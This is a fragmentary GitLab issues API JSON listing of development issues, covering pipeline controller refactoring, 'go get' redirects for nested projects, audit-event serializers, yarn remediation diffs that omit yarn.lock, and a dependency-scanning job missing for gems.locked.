Waldner","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3796140/avatar.png","web_url":"https://gitlab.com/sarahwaldner"},"labels":["HackerOne","Weakness::CWE-918","[deprecated] Accepting merge requests","backend","devops::monitor","group::respond","priority::3","section::ops","security","severity::3","workflow::ready for development"],"milestone":{"id":1212252,"iid":48,"group_id":9970,"title":"Next 1-3 releases","description":"Issues which are not quite ready to schedule, but should be considered as part of the near-term roadmap.","state":"active","created_at":"2020-03-26T20:39:10.889Z","updated_at":"2020-03-26T20:39:10.889Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/48"},"assignees":[],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":null,"user_notes_count":26,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2020-09-06","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/220772","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/220772","notes":"https://gitlab.com/api/v4/projects/278964/issues/220772/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/220772/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#220772","relative":"#220772","full":"gitlab-org/gitlab#220772"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":35814485,"iid":220767,"project_id":278964,"title":"Backfill imported snippet repositories","description":"Now that we fixed all the problems we had with failed imports and snippet repositories not being created (https://gitlab.com/gitlab-org/gitlab/-/issues/219752), we need to backfill those non-migrated snippets that we still have in the production.\n\nIn prod, we have only a few of them, 130 records.

This can be undesirable as the `PipelinesController` has a set of actions and operations that are considered `final` which are served by the set of endpoints described by: `/pipelines(/:id)(.format)`. When we inherit from PipelinesController, a badly written route can expose these actions inadvertently in a different context, like: `/pipelines/stages/...`.\n\n## Proposal\n\nIf our intent is to have a controller that we can inherit from, we could create a base or abstract controller like: `Projects::(Base|Abstract)PipelinesController` where `PipelinesController/Stages/TestsControllers` and others could inherit from.\n\nOverall, we follow a model wherein there is a `Projects::ApplicationController` that is serving as an abstract controller. I would assume that we could follow the same pattern for `Projects::Pipelines::ApplicationController` and have it be a top-level abstract controller for a given set of `Pipeline` functionalities that are common, like finding `pipeline_id`.\n\nFor example:\n```\nProjects::PipelinesController \u003c Projects::ApplicationController\n# a top-level controller for handling `/pipelines(/:id)(.format)`\n\nProjects::Pipelines::ApplicationController \u003c Projects::ApplicationController\n# an abstract controller for all subpaths of a `/pipelines/:pipeline_id`\n\nProjects::Pipelines::TestsController \u003c Projects::Pipelines::ApplicationController\n# `/pipelines/:pipeline_id/tests(/:id)(.format)`\n\nProjects::Pipelines::StagesController \u003c Projects::Pipelines::ApplicationController\n# `/pipelines/:pipeline_id/stages(/:id)(.format)`\n```\n\nEnsure that this MR is reviewed by a reviewer and a maintainer in ~\"group::continuous integration\" .\n\n## Motivation\n\nThe following discussion from !33895 should be addressed:\n\n- [ ] @morefice started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/33895#note_356373888):  (+3 comments)\n\n\u003e OMG. I saw that.

off the root namespace.\n\nHowever, for deep nested projects, it does not work correctly, in that the client is redirected to the second level nesting, which in this case will be a group. \n\n![image](/uploads/f78b709f3e1204c987b1fb03f85cdef4/image.png)\n\n`go get` will then attempt to perform a `git clone` of `https://gitlab.com/group/sub-group`, which is a group and cannot be

however, we still need to know usage for **overridden** approval rules for merge requests (when the `Can override approvals in merge request` option is ticked in repo settings).\n\n### Further details\n\nWe should be able to distinguish between the two types by looking at the `ApprovalMergeRequestRuleSource` for an `ApprovalMergeRequestRule`\n\n### Proposal\n\nFrom https://gitlab.com/gitlab-org/gitlab/-/issues/220541#note_358825262:\n\n\u003e First, we need to check which MRs have project approval rules (from `approval_project_rules`) that are not a source rule of merge request approval rules (from `approval_merge_request_rules`). We need to only count the MRs that are from `projects` with `disable_overriding_approvers_per_merge_request` as `false`. These are MRs with deleted approval rules.\n\nNext, we need to check which MRs have merge request approval rules that have different `name`, `approvals_required`, `users`, or `groups` from their source project approval rule. Like the first list, we only need to count the MRs that are from `projects` with `disable_overriding_approvers_per_merge_request` as `false`.

The intention behind `events: @events.json` is very clear IMO.\n\nAdditionally, consider refactoring the controller so that `is_last_page: @events.last_page?.to_json` becomes `is_last_page: @is_last_page.to_json` or something similar.\n\n```ruby\nevents = Gitlab::Audit::Events::Preloader.preload!(\n  AuditLogFinder\n    .new(level: level, params: audit_logs_params)\n    .execute\n    .page(params[:page])\n    .without_count\n)\n@is_last_page = events.last_page?\n@events = AuditEventSerializer.new.represent(events)\n```\n\nYou could then refactor the view:\n\n```ruby\nevents: @events.to_json,\nis_last_page: @is_last_page.to_json,\n```\n\nI make no guarantees about how well this will play with Vue, as there may be things I've missed but hopefully, the intent behind my comment is clear :smile:\n\n---\n\nWe should change the following locations:\n\n* `ee/app/controllers/admin/audit_logs_controller.rb:14`\n* `ee/app/views/admin/audit_logs/index.html.haml:4`\n* `ee/app/controllers/groups/audit_events_controller.rb:23`\n* `ee/app/views/groups/audit_events/index.html.haml:7`\n* `ee/app/controllers/projects/audit_events_controller.rb:23`\n* `ee/app/views/projects/audit_events/index.html.haml:7`","state":"closed","created_at":"2020-06-05T14:03:20.167Z","updated_at":"2021-10-28T14:11:21.085Z","closed_at":"2020-08-19T08:33:16.182Z","closed_by":{"id":438961,"username":"splattael","name":"Peter Leitzen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/97c2ff0fc99cc4eede69be9ac238c304?s=80\u0026d=identicon","web_url":"https://gitlab.com/splattael"},"labels":["Category:Audit Events","Enterprise Edition","backend","devops::manage","estimation::completed","group::compliance","missed:13.1","priority::4","type::maintenance"],"milestone":{"id":1233752,"iid":50,"group_id":9970,"title":"13.3","description":"https://about.gitlab.com/releases/2020/08/22/gitlab-13-3-released/","state":"closed","created_at":"2020-04-09T17:39:21.090Z","updated_at":"2022-04-13T14:50:18.976Z","due_date":"2020-08-17","start_date":"2020-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/50"},"assignees":[{"id":398752,"username":"tancnle","name":"Tan Le","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/398752/avatar.png","web_url":"https://gitlab.com/tancnle"}],"author":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"type":"ISSUE","assignee":{"id":398752,"username":"tancnle","name":"Tan Le","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/398752/avatar.png","web_url":"https://gitlab.com/tancnle"},"user_notes_count":4,"merge_requests_count":1,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/220523","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/220523","notes":"https://gitlab.com/api/v4/projects/278964/issues/220523/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/220523/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#220523","relative":"#220523","full":"gitlab-org/gitlab#220523"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3319,"epic":{"id":53935,"iid":3319,"title":"Combine Admin Audit Event, Group and Project Audit Logs templates into one unified template","url":"/groups/gitlab-org/-/epics/3319","group_id":9970,"human_readable_end_date":"Oct 17, 2020","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":35483698,"iid":220519,"project_id":278964,"title":"Follow-up from \"Geo: Track PackageFile sync counts in Geo node statuses\"","description":"The following discussion from !33079 should be addressed:\n\n- [ ] @dbalexandre commented on a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/33079#note_355530969):  (+4 comments)\n\n    \u003e suggestion (non-blocking): @vsizov There is a way to guess the factory name based on the registry class, see https://gitlab.com/gitlab-org/gitlab/-/merge_requests/32695/diffs#2a6d59a024221f8f71d9b763fb823e0ad85734f1_8_10.

It relies on the `yarn` CLI to update `package.json` and `yarn.lock`, respectively the editable dependency file and the generated lock file.\n \n`yarn` might update `package.json` even thought the dependencies haven't changed. It particular, it might reformat the JSON document, reorder the dependencies, or add an EOL character at the end of the files. Such changes are irrelevant but are nevertheless included in the remediation diff.\n\n`yarn` also updates `yarn.lock`, but for some reason this is not included in the remediation diff. This is the main problem since `yarn.lock` needs to be updated in order to remediate the vulnerability.\n\nSince `yarn.lock` is ignored when generating the diff, we get no diff when `package.json` is unchanged, thus no remediation. Also, we get an irrelevant diff when `yarn` simply reformats `package.json`.\n\n### Steps to reproduce\n\n1. Import https://gitlab.com/enriquesantosblanco/dependency-vulnerability-comparison-yarn\n1. Create MR that adds empty space to package.json and merge it once pipeline is passing.\n1. Go to security dashboard and find `Modification of Assumed-Immutable Data (MAID) in lodash`\n1. Create remediations for this vulnerability\n\nSee https://gitlab.com/gitlab-org/gitlab/-/issues/220487#note_406058352\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\n### What is the current *bug* behavior?\n\nThe vulnerability has a remediation where only `package.json` is reformatted. This doesn't solve the vulnerability.\n\n### What is the expected *correct* behavior?\n\nThe remediation updates `yarn.lock`. Also, ideally the remediation doesn't update `package.json` with changes that are not relevant to the remediation.\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\n\n### Possible fixes\n\n- Figure out why [gemnasium](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium) doesn't include `yarn.lock` in the remediation diff.\n- Make sure auto-remediation is skipped when `package.json` changes but `yarn.lock` doesn't.\n- Make sure this is covered by QA, using test projects.\n\nZD: https://gitlab.zendesk.com/agent/tickets/158755

job not triggered for gems.locked","description":"### Summary\n\nThe `gemnasium-dependency_scanning` job is not triggered for a repository containing a `gems.locked`, even though this alias for `Gemfile.lock` is supported by the Gemnasium analyzer.\n\nThis ~regression was introduced when switching to the rules syntax. See https://gitlab.com/groups/gitlab-org/-/epics/2300\n\nSee https://depfu.com/blog/2017/09/06/gemfiles-new-clothes\n\n### Steps to reproduce\n\n- create a Bundler project with a `gems.locked`, and no `Gemfile.lock`\n- include the Dependency Scanning template in the CI configuration\n\n### Example Project\n\nSee https://gitlab.com/gitlab-org/security-products/tests/ruby-bundler/-/merge_requests/1222#note_355317861\n\n[Renaming the lock file to `gems.locked`](https://gitlab.com/gitlab-org/security-products/tests/ruby-bundler/-/commit/3c2d9a01e05d701e509ee7c75e1cc04c96e40e9b?merge_request_iid=1222) results in an [invalid pipeline](https://gitlab.com/gitlab-org/security-products/tests/ruby-bundler/-/pipelines/152869258) because the `gemnasium-dependency_scanning` job no longer exists.\n\n### What is the current *bug* behavior?\n\nNo `gemnasium-dependency_scanning` job\n\n### What is the expected *correct* behavior?\n\n`gemnasium-dependency_scanning` job is triggered.\n\n### Possible fixes\n\n~~Fix the `rules:exists` of the job.~~ We already have rules to detect `gems.locked` in the [Dependency Scanning template](https://gitlab.com/gitlab-org/gitlab/-/blob/38332ea9ceed122b5d32428a1c0f93fe0e44c25c/lib/gitlab/ci/templates/Security/Dependency-Scanning.gitlab-ci.yml#L110), so the issue might be more complex than just a missing rule to detect that kind of files.","state":"closed","created_at":"2020-06-05T09:47:30.251Z","updated_at":"2020-06-17T03:44:15.779Z","closed_at":"2020-06-08T11:08:10.129Z","closed_by":{"id":1958785,"username":"fcatteau","name":"Fabien
